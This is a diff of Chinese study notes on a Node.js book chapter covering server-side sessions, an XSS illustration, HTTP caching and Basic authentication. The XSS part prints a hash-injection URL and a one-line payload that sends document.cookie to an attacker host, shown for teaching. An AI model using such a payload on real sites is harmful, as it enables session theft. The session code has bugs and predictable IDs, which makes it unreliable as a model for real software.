@@ -208,8 +208,207 @@ function (req, res) {
 
 #### 8.1.5 Session
 
+> 通过Cookie，浏览器和服务器可以实现状态的记录。但是Cookie并非是完美的，前文提及的 体积过大就是一个显著的问题，为严重的问题是Cookie可以在前后端进行修改，因此数据就极 容易被篹改和伪造。如果服务器端有部分逻辑是根据Cookie中的isVIP字段进行判断，那么一个 普通用户通过修改Cookie就可以轻松享受到VIP服务了。综上所述，Cookie对于敏感数据的保护是无效的。 
+>
+> 为了解决Cookie敏感数据的问题，Session应运而生。Session的数据只保留在服务器端，客户 端无法修改，这样数据的安全性得到一定的保障，数据也无须在协议中每次都被传递
 
+我们可以将 Cookie 和 Session 结合起来，将经过服务器加密的口令放在 Cookie 中，这样既可以保证一定的安全性，又可以在服务器端进行状态控制。
 
+那么口令如何产生呢，以下为生成 session 的代码：
 
+```javascript
+var sessions = {}
+var key = 'session_id'
+var EXPIRES = 20 * 60 * 1000
+var generate = function () {
+    var session = {}
+    session.id = (new Date()).getTime() + Math.random()
+    session.cookie = {
+        expire: (new Date()).getTime() + EXPIRES
+    }
+    sessions[session.id] = session
+    return session
+}
+```
 
-> 本次阅读至 P184 8.1.5 Session 202
+每个请求到来时，检查 Cookie 中的口令和服务器端的数据，如果过期，就重新生成，如下所示：
+
+```javascript
+function (req, res) {
+    var id = req.cookies[key]
+    if (!id) {
+        req.session = generate()
+    } else {
+        var session = sessions[id]
+        if (session) {
+            if (session.cookie.expire > (new Date()).getTime()) {
+                // 更新超过时间
+                session.cookie.expire = (new Date()).getTime() + EXPIRES
+                req.session = session
+            } else {
+                // 超时，删除旧数据并重新生成
+                delete sessions[id]
+                req.session = generate()
+            }
+        } else {
+            // session 过期或者口令不对，重新生成 session
+            req.session = generate()
+        }
+    }
+    handle(req, res)
+}
+```
+
+同时我们还需要在响应给客户端时设置新的值，以便下次请求时能够对应服务端的数据。这一流程可以通过 hack 响应对象的 writeHead() 方法实现：
+
+```javascript
+function hackWriteHead (res) {
+    var writeHead = res.writeHead
+    res.writeHead = function () {
+        var cookies = res.getHeader('Set-Cookie')
+        var session = serialize('Set-Cookie', req.session.id)
+        cookies = Array.isArray(cookies) ? cookies.concat(session) : [cookies, session]
+        res.setHeader('Set-Cookie', cookies)
+        // 应用原来的方法
+        return writeHead.apply(this, arguments)
+    }
+}
+```
+
+这样，业务逻辑就可以判断和设置 session 并以此来维护用户和服务器端的关系了，如下示例：
+
+```javascript
+var handle = function (req, res) {
+    hackWriteHead(res)
+    if (!req.session.isVisit) {
+        res.session.isVisit = true
+        res.writeHead(200)
+        res.end('欢迎首次来到动物园')
+    } else {
+        res.writeHead(200)
+        res.end('动物园再次欢迎您')
+    }
+}
+```
+
+**当然，除了以上的办法外，我们还可以通过查询字符串来实现浏览器端和服务器端的数据对应**。
+
+```javascript
+var getURL = function (_url, key, value) {
+    var obj = url.parse(_url, true)
+    obj.query[key] = value
+    return url.format(obj)
+}
+```
+
+随后形成 302 跳转，让客户端重新发起请求
+
+```javascript
+function (req, res) {
+    var redirect = function (url) {
+        res.setHeader('Location', url)
+        res.writeHead(302)
+        res.end()
+    }
+    var id = req.query[key]
+    if (!id) {
+        // 首次访问，无 session
+        var session = generate()
+        redirect(getURL(req.url, key, session.id))
+    } else {
+        var session = sessions[id]
+        if (session) {
+            if (session.cookie.expire > (new Date()).getTime()) {
+                // 更新超过时间
+                session.cookie.expire > (new Date()).getTime() + EXPIRES
+                req.seesion = session
+                handle(req, res)
+            } else {
+                // 超时了，删除旧的数据并重新生成
+                delete sessions[id]
+                var session = generate()
+                redirect(getURL(req.url, key, session.id))
+            }
+        } else {
+            // session 过期或者口令不对，重新生成
+            var session = generate()
+            redirect(getURL(req.url, key, session.id))
+        }
+    }
+}
+```
+
+如此就可以不借助 Cookie ，仅借助一个 URL 就完成了身份的认证。但这样也有缺点，即一旦 URL 暴露，就有身份被盗用的风险。
+
+除了以上的两种方法，我们还可以利用 HTTP 请求头中的 ETag 来处理 Session，在此不详加解释。
+
+> 在上面的示例代码中，我们都将Session数据直接存在变量sessions中，它位于内存中。然而 在第5章的内存控制部分，我们分析了为什么Node会存在内存限制，这里将数据存放在内存中将 会带来极大的隐患，如果用户增多，我们很可能就接触到了内存限制的上限，并且内存中的数据 量加大，必然会引起垃圾回收的频繁扫描，引起性能问题。 另一个问题则是我们可能为了利用多核CPU而启动多个进程，这个细节在第9章中有详细描 述。用户请求的连接将可能随意分配到各个进程中，Node的进程与进程之间是不能直接共享内存 的，用户的Session可能会引起错乱。
+>
+> 为了解决性能问题和Session数据无法跨进程共享的问题，常用的方案是将Session集中化，将 原本可能分散在多个进程里的数据，统一转移到集中的数据存储中。目前常用的工具是Redis、 Memcached等，通过这些高效的缓存，Node进程无须在内部维护数据对象，垃圾回收问题和内存 限制问题都可以迎刃而解，并且这些高速缓存设计的缓存过期策略更合理更高效，比在Node中自 行设计缓存策略更好。
+>
+> 尽管采用专门的缓存服务会比直接在内存中访问慢，但其影响小之又小，带来的好处却远远 大于直接在Node中保存数据。 为此，一旦Session需要异步的方式获取，代码就需要略作调整，变成异步的方式。
+
+> **XSS漏洞**
+>
+> XSS的全称是跨站脚本攻击（Cross Site Scripting，通常简称为XSS），通常都是由网站开发者决定哪些脚本可以执行在浏览器端，不过XSS漏洞会让别的脚本执行。它的主要形成原因多数是 用户的输入没有被转义，而被直接执行。
+>
+> *example*
+>
+> 下面是某个网站的前端脚本，它会将URL hash中的值设置到页面中，以实现某种逻辑，如下 所示
+>
+> ```javascript
+> $('#box').html(location.hash.replace('#', '')); 
+> ```
+>
+> 攻击者在发现这里的漏洞后，构造了这样的URL：
+>
+> ```javascript
+> http://a.com/pathname#<script src="http://b.com/c.js"></script> 
+> ```
+>
+> 为了不让受害者直接发现这段URL中的猫腻，它可能会通过URL压缩成一个短网址，如下所示：
+>
+> `http://t.cn/fasdlfj`或者再次压缩 `http://url.cn/fasdlfb` 然后将终的短网址发给某个登录的在线用户。这样一来，这段hash中的脚本将会在这个用 户的浏览器中执行，而这段脚本中的内容如下所示： 
+>
+> ```javascript
+> location.href = "http://c.com/?" + document.cookie;
+> ```
+> 这段代码将该用户的Cookie提交给了c.com站点，这个站点就是攻击者的服务器，他也就能拿到该用户的Session口令。然后他在客户端中用这个口令伪造Cookie，从而实现了伪装用户的身 份。如果该用户是网站管理员，就可能造成极大的危害
+
+#### 8.1.6 缓存
+
+为了提高性能，有几条关于缓存的规则：
+
+- 添加 Expires 或 Cache-Control 到报文头中
+- 配置 ETags
+- 让 Ajax 可缓存
+
+通常来说，大多数缓存只应用于 GET 请求中。通过 HTTP 的一些特定 HEAD 字段来判定是否使用缓存。
+
+关于更多 HTTP 缓存字段的内容，可以看[这篇博文](https://blog.liubasara.info/#/post/%E6%B5%85%E8%B0%88HTTP%E7%BC%93%E5%AD%98)
+
+#### 8.1.7 Basic认证
+
+Basic 认证是当客户端与服务器端进行请求时允许通过用户名和密码实现身份认证的方式。
+
+请求报文头中的 Authorization 字段中的值由认证方式和加密值构成，当页面认证方式为 Basic 时，其值如下所示：
+
+```shell
+Authorization: Basic dXNlcjpwYXNz 
+```
+
+在 Basic 认证中，它会将用户和密码部分组合成 `username:password` 样式，然后再进行 Base64 编码。
+
+```javascript
+var encode = function (username, password) {
+    return new Buffer(username + ':' + password).toString('base64')
+}
+```
+
+如果用户首次访问该网页，URL 中也没有认证内容，那么浏览器会响应一个401未授权状态码。
+
+```javascript
+
+```
+
+> 本次阅读至 P194 212页
